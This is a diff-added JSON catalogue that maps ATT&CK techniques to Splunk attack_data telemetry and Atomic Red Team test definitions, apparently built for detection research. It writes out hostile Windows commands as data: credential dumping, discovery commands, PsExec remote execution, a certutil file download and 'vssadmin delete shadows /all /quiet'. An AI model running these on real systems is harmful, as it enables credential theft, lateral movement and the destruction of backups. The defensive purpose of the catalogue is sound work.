+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1003.002/T1003.002.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1003.002",
+   "dataset": {
+    "author": "Patrick Bareiss",
+    "date": "2020-10-08",
+    "description": "Atomic Test Results: Successful Execution of test T1003.002-1 Registry dump of SAM, creds, and secrets Return value unclear for test T1003.002-2 Registry parse with pypykatz Successful Execution of test T1003.002-3 esentutl.exe SAM copy",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1003.002/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1003.002/atomic_red_team"
+   },
+   "dataset_id": "T1003.002",
+   "execution_kind": "atomic test",
+   "link": "named",
+   "name": "Security Account Manager",
+   "note": null,
+   "tactics": [
+    "credential-access"
+   ],
+   "telemetry": "T1003.002/registry-dump-of-sam-creds-and-secrets.jsonl.gz"
+  },
+  {
+   "atomic": null,
+   "attack_id": "T1558.003",
+   "dataset": {
+    "author": "Patrick Bareiss",
+    "date": "2020-10-08",
+    "description": "Manual kerberoasting attack with mimikatz. Changed the kerberos encryption type to RC4.",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1558.003/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1558.003/atomic_red_team"
+   },
+   "dataset_id": "T1558.003",
+   "execution_kind": "recorded technique execution",
+   "link": "recorded",
+   "name": "Kerberoasting",
+   "note": "Dataset description: manual kerberoasting with mimikatz. The shipped Sysmon file (truncated upstream at 10,000 events) contains no kerberoasting activity, so no anchor exists and the file head is used.",
+   "tactics": [
+    "credential-access"
+   ],
+   "telemetry": "T1558.003/recorded-execution.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "",
+    "command": "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum",
+    "description": "Identify System Info. Upon execution, system info and time info will be displayed.",
+    "elevation_required": false,
+    "executor": "command_prompt",
+    "guid": "66703791-c902-4560-8770-42b8a91f7667",
+    "input_arguments": {},
+    "name": "System Information Discovery",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1082/T1082.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1082",
+   "dataset": {
+    "author": "Patrick Bareiss",
+    "date": "2020-10-09",
+    "description": "Atomic Red Team Execution of T1082",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1082/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1082/atomic_red_team"
+   },
+   "dataset_id": "T1082",
+   "execution_kind": "atomic test",
+   "link": "command-matched",
+   "name": "System Information Discovery",
+   "note": null,
+   "tactics": [
+    "discovery"
+   ],
+   "telemetry": "T1082/system-information-discovery.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "",
+    "command": "cmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"#{computer_name}\"\nquser\nqwinsta.exe /server:#{computer_name}\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt",
+    "description": "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.",
+    "elevation_required": false,
+    "executor": "command_prompt",
+    "guid": "4c4959bf-addf-4b4a-be86-8d09cc1857aa",
+    "input_arguments": {
+     "computer_name": "localhost"
+    },
+    "name": "System Owner/User Discovery",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1033/T1033.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1033",
+   "dataset": {
+    "author": "Automated Attack Data Service",
+    "date": "2020-12-04",
+    "description": "Atomic Test Results: Return value unclear for test T1033-1 System Owner/User Discovery Return value unclear for test T1033-3 Find computers where user has session - Stealth mode (PowerView)",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1033/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1033/atomic_red_team"
+   },
+   "dataset_id": "T1033",
+   "execution_kind": "atomic test",
+   "link": "named",
+   "name": "System Owner/User Discovery",
+   "note": null,
+   "tactics": [
+    "discovery"
+   ],
+   "telemetry": "T1033/system-owner-user-discovery.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "",
+    "command": "net view /domain\nnet view",
+    "description": "Identify remote systems with net.exe.\n\nUpon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.",
+    "elevation_required": false,
+    "executor": "command_prompt",
+    "guid": "85321a9c-897f-4a60-9f20-29788e50bccd",
+    "input_arguments": {},
+    "name": "Remote System Discovery - net",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1018/T1018.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1018",
+   "dataset": {
+    "author": "Jose Hernandez",
+    "date": "2020-12-16",
+    "description": "Atomic Test Results: Return value unclear for test T1018-1 Remote System Discovery - net Return value unclear for test T1018-2 Remote System Discovery - net group Domain Computers Return value unclear for test T1018-3 Remote System Discovery - nltest Return value unclear for test T1018-4 Remote System Discovery - ping sweep Return value unclear for test T1018-5 Remote System Discovery - arp Return value unclear for test T1018-8 Remote System Discovery - nslookup Return value unclear for test T1018-9 Remote System Discovery - adidnsdump Return value unclear for test T1018-10 Adfind - Enumerate Active Directory Computer Objects Return value unclear for test T1018-11 Adfind - Enumerate Active Directory Domain Controller Objects",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1018/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1018/atomic_red_team"
+   },
+   "dataset_id": "T1018",
+   "execution_kind": "atomic test",
+   "link": "named",
+   "name": "Remote System Discovery",
+   "note": null,
+   "tactics": [
+    "discovery"
+   ],
+   "telemetry": "T1018/remote-system-discovery-net.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "",
+    "command": "net localgroup\nnet localgroup \"Administrators\"",
+    "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.",
+    "elevation_required": false,
+    "executor": "command_prompt",
+    "guid": "1f454dd6-e134-44df-bebb-67de70fb6cd8",
+    "input_arguments": {},
+    "name": "Basic Permission Groups Discovery Windows (Local)",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1069.001/T1069.001.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1069.001",
+   "dataset": {
+    "author": "Michael Haag",
+    "date": "2021-09-14",
+    "description": "Simulated events with Atomic Red Team and manual.",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1069.001/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1069.001/atomic_red_team"
+   },
+   "dataset_id": "T1069.001",
+   "execution_kind": "atomic test",
+   "link": "command-matched",
+   "name": "Local Groups",
+   "note": null,
+   "tactics": [
+    "discovery"
+   ],
+   "telemetry": "T1069.001/basic-permission-groups-discovery-windows-local.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "",
+    "command": "\"#{psexec_exe}\" #{remote_host} -accepteula -c #{command_path}",
+    "description": "Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).",
+    "elevation_required": true,
+    "executor": "command_prompt",
+    "guid": "0eb03d41-79e4-4393-8e57-6344856be1cf",
+    "input_arguments": {
+     "command_path": "C:\\Windows\\System32\\cmd.exe",
+     "psexec_exe": "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe",
+     "remote_host": "\\\\localhost"
+    },
+    "name": "Copy and Execute File with PsExec",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1021.002/T1021.002.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1021.002",
+   "dataset": {
+    "author": "Patrick Bareiss",
+    "date": "2020-11-10",
+    "description": "Atomic Test Results: Return value unclear for test T1021.002-1 Map admin share Successful Execution of test T1021.002-2 Map Admin Share PowerShell Return value unclear for test T1021.002-3 Copy and Execute File with PsExec Return value unclear for test T1021.002-4 Execute command writing output to local Admin Share",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1021.002/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1021.002/atomic_red_team"
+   },
+   "dataset_id": "T1021.002",
+   "execution_kind": "atomic test",
+   "link": "named",
+   "name": "SMB/Windows Admin Shares",
+   "note": "Task 1 listed 'Map admin share'; the shipped Sysmon file holds only 10 events and its description names that test, but it contains no 'net use' command. It does contain 'Copy and Execute File with PsExec' (also named in the description), so that test is used.",
+   "tactics": [
+    "lateral-movement"
+   ],
+   "telemetry": "T1021.002/copy-and-execute-file-with-psexec.jsonl.gz"
+  },
+  {
+   "atomic": null,
+   "attack_id": "T1550.002",
+   "dataset": {
+    "author": "Patrick Bareiss",
+    "date": "2020-10-08",
+    "description": "Manual generation of attack data including pass the hash attack with mimikatz and psexec.",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1550.002/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1550.002/atomic_red_team"
+   },
+   "dataset_id": "T1550.002",
+   "execution_kind": "recorded technique execution",
+   "link": "recorded",
+   "name": "Pass the Hash",
+   "note": "Dataset description: manual pass the hash with mimikatz and psexec. The anchor is the mimikatz.exe launch; the command line carries no sekurlsa::pth argument (mimikatz was run interactively).",
+   "tactics": [
+    "lateral-movement"
+   ],
+   "telemetry": "T1550.002/recorded-execution.jsonl.gz"
+  },
+  {
+   "atomic": null,
+   "attack_id": "T1560.001",
+   "dataset": {
+    "author": "Michael Haag",
+    "date": "2021-04-22",
+    "description": "The following data was generated with Cobalt Strike spawning 7z.exe to archive files on disk.",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1560.001/archive_utility",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1560.001/archive_utility"
+   },
+   "dataset_id": "T1560.001",
+   "execution_kind": "recorded technique execution",
+   "link": "recorded",
+   "name": "Archive via Utility",
+   "note": "Dataset description: Cobalt Strike spawning 7z.exe to archive files; not an Atomic Red Team run.",
+   "tactics": [
+    "collection"
+   ],
+   "telemetry": "T1560.001/recorded-execution.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "del #{local_path} >nul 2>&1",
+    "command": "cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}",
+    "description": "Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!",
+    "elevation_required": false,
+    "executor": "command_prompt",
+    "guid": "dd3b61dd-7bbc-48cd-ab51-49ad1a776df0",
+    "input_arguments": {
+     "local_path": "Atomic-license.txt",
+     "remote_file": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
+    },
+    "name": "certutil download (urlcache)",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1105/T1105.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1105",
+   "dataset": {
+    "author": "Michael Haag, Splunk",
+    "date": "2021-03-25",
+    "description": "Successful execution of Atomic Red Team T1105 - Ingress Tool Transfer. Also included Invoke-CertUtil using different command switches.",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1105/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1105/atomic_red_team"
+   },
+   "dataset_id": "T1105",
+   "execution_kind": "atomic test",
+   "link": "command-matched",
+   "name": "Ingress Tool Transfer",
+   "note": null,
+   "tactics": [
+    "command-and-control"
+   ],
+   "telemetry": "T1105/certutil-download-urlcache.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "",
+    "command": "vssadmin.exe delete shadows /all /quiet",
+    "description": "Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon\nexecution, if no shadow volumes exist the message \"No items found that satisfy the query.\" will be displayed. If shadow volumes are present, it\nwill delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n\nconfirmation prompt. Shadow copies can only be created on Windows server or Windows 8.\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)",
+    "elevation_required": true,
+    "executor": "command_prompt",
+    "guid": "43819286-91a9-4369-90ed-d31fb4da2c01",
+    "input_arguments": {},
+    "name": "Windows - Delete Volume Shadow Copies",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1490/T1490.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1490",
+   "dataset": {
+    "author": "Patrick Bareiss",
+    "date": "2020-11-09",
+    "description": "Atomic Test Results: Successful Execution of test T1490-1 Windows - Delete Volume Shadow Copies Successful Execution of test T1490-2 Windows - Delete Volume Shadow Copies via WMI Return value unclear for test T1490-3 Windows - Delete Windows Backup Catalog Successful Execution of test T1490-4 Windows - Disable Windows Recovery Console Repair Return value unclear for test T1490-5 Windows - Delete Volume Shadow Copies via WMI with PowerShell Successful Execution of test T1490-6 Windows - Delete Backup Files",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1490/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1490/atomic_red_team"
+   },
+   "dataset_id": "T1490",
+   "execution_kind": "atomic test",
+   "link": "named",
+   "name": "Inhibit System Recovery",
+   "note": null,
+   "tactics": [
+    "impact"
+   ],
+   "telemetry": "T1490/windows-delete-volume-shadow-copies.jsonl.gz"
+  }
+ ]
+}
